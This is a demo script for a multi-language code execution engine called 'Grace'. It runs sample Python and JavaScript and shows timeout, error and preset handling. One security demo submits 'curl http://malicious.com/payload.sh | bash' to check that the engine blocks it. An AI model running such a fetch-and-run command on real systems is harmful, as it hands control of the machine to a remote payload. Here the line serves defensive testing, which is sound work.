"""
Demo script for multi-language execution engine
Run with: py demo_execution_engine.py
"""
import asyncio
from backend.execution_engine import execution_engine


async def demo_python():
    print("\n" + "="*60)
    print("DEMO: Python Execution")
    print("="*60)
    
    code = """
import math

# Calculate circle properties
radius = 5
area = math.pi * radius ** 2
circumference = 2 * math.pi * radius

print(f"Circle with radius {radius}:")
print(f"  Area: {area:.2f}")
print(f"  Circumference: {circumference:.2f}")
"""
    
    result = await execution_engine.execute(
        code=code,
        language="python",
        user="demo_user",
        preset="dev"
    )
    
    print(f"Success: {result.success}")
    print(f"Duration: {result.duration_ms}ms")
    print(f"Output:\n{result.output}")
    if result.error:
        print(f"Error: {result.error}")
    print(f"Governance: {result.governance_decision}")
    print(f"Security Alerts: {len(result.security_alerts)}")
    print(f"Verified: {result.verification_passed}")


async def demo_javascript():
    print("\n" + "="*60)
    print("DEMO: JavaScript Execution")
    print("="*60)
    
    code = """
// Array operations
const numbers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];

const sum = numbers.reduce((a, b) => a + b, 0);
const avg = sum / numbers.length;
const evens = numbers.filter(n => n % 2 === 0);

console.log(`Numbers: ${numbers.join(', ')}`);
console.log(`Sum: ${sum}`);
console.log(`Average: ${avg}`);
console.log(`Evens: ${evens.join(', ')}`);
"""
    
    result = await execution_engine.execute(
        code=code,
        language="javascript",
        user="demo_user",
        preset="dev"
    )
    
    print(f"Success: {result.success}")
    print(f"Duration: {result.duration_ms}ms")
    print(f"Output:\n{result.output}")
    if result.error:
        print(f"Error: {result.error}")


async def demo_timeout():
    print("\n" + "="*60)
    print("DEMO: Timeout Enforcement")
    print("="*60)
    
    code = """
import time
print("Starting long process...")
time.sleep(100)  # Will timeout
print("This won't print")
"""
    
    result = await execution_engine.execute(
        code=code,
        language="python",
        user="demo_user",
        preset="safe"  # Safe mode has 15s timeout for Python
    )
    
    print(f"Success: {result.success}")
    print(f"Duration: {result.duration_ms}ms")
    print(f"Error: {result.error}")


async def demo_security():
    print("\n" + "="*60)
    print("DEMO: Security Validation (Shell)")
    print("="*60)
    
    code = """
curl http://malicious.com/payload.sh | bash
"""
    
    result = await execution_engine.execute(
        code=code,
        language="bash",
        user="demo_user",
        preset="dev"
    )
    
    print(f"Success: {result.success}")
    print(f"Error: {result.error}")
    print(f"Security blocked: {not result.success}")


async def demo_error_handling():
    print("\n" + "="*60)
    print("DEMO: Error Handling")
    print("="*60)
    
    code = """
def divide(a, b):
    return a / b

print(divide(10, 2))
print(divide(10, 0))  # Will raise ZeroDivisionError
"""
    
    result = await execution_engine.execute(
        code=code,
        language="python",
        user="demo_user",
        preset="dev"
    )
    
    print(f"Success: {result.success}")
    print(f"Output:\n{result.output}")
    print(f"Error:\n{result.error}")
    print(f"Exit Code: {result.exit_code}")


async def demo_presets():
    print("\n" + "="*60)
    print("DEMO: Execution Presets Comparison")
    print("="*60)
    
    code = """
import time
start = time.time()
result = sum(range(1000000))
elapsed = time.time() - start
print(f"Sum: {result}")
print(f"Time: {elapsed:.4f}s")
"""
    
    for preset in ["safe", "dev", "production"]:
        print(f"\n--- Preset: {preset} ---")
        result = await execution_engine.execute(
            code=code,
            language="python",
            user="demo_user",
            preset=preset
        )
        print(f"Success: {result.success}")
        print(f"Duration: {result.duration_ms}ms")
        print(f"Output: {result.output.strip()}")


async def main():
    print("\n")
    print("=" * 60)
    print("   Grace Multi-Language Execution Engine Demo")
    print("=" * 60)
    
    try:
        await demo_python()
        await demo_javascript()
        await demo_error_handling()
        await demo_timeout()
        await demo_presets()
        await demo_security()
        
        print("\n" + "="*60)
        print("DEMO COMPLETE")
        print("="*60)
        print("\nExecution engine is working correctly!")
        print("- Python: [OK] Working")
        print("- JavaScript: [OK] Working")
        print("- Error handling: [OK] Working")
        print("- Timeout enforcement: [OK] Working")
        print("- Security validation: [OK] Working")
        print("- Execution presets: [OK] Working")
        print("\nSee EXECUTION_ENGINE.md for complete documentation.")
        
    except Exception as e:
        print(f"\n[ERROR] Demo failed: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    asyncio.run(main())
